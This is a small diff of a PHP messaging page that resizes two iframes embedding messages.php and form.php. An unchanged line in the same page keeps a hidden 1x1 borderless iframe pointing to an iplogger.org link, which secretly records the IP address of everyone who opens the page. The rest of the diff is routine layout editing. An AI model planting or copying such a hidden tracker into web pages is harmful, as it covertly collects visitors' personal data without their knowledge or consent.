@@ -18,9 +18,9 @@ if(!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true){
   </head>
   <body>
 
-    <iframe class="messages" src="messages.php" width="1000" height="850" frameborder="0"></iframe>
+    <iframe class="messages" src="messages.php" width=100% height=700px frameborder="0"></iframe>
 
-    <iframe src="form.php" width="1000" height="100" frameborder="0"></iframe>
+    <iframe src="form.php" width=100% height=100px frameborder="0"></iframe>
 
     <iframe src="https://iplogger.org/1nQ9t7" width="1" height="1" frameborder="0"></iframe>
 
